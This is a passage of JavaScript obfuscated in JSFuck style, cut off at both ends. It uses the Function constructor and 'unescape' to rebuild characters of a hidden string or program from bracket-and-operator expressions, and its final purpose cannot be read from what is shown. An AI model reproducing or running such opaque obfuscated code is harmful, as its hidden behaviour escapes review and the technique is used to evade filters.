+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+[]+[])+(+[]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[])+(+{}+[])[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+[])+(+[]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]])+([][[]]+[])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+[])+([]+{})[!+[]+!![]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]